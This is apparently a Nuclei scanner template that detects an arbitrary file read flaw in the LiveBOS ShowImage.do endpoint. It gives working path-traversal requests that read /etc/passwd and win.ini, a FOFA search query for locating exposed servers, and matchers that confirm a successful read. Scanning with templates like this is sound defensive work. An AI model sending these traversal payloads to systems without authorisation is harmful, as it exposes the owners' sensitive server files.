id: livebos-showimage-do-fileread

info:
  name: liveBOS Showimage.do - fileread
  author: hufei
  severity: high
  description: LiveBOS Showimage.do 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件。
  reference:
    - https://xiaochuhe.blog.csdn.net/article/details/132410214
  metadata:
    verified: true
    fofa-query: app="LiveBOS-框架" || body=“Power by LiveBOS”
  tags: 2023,livebos,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"
      - "{{BaseURL}}/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../c:/windows/win.ini"
    
    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

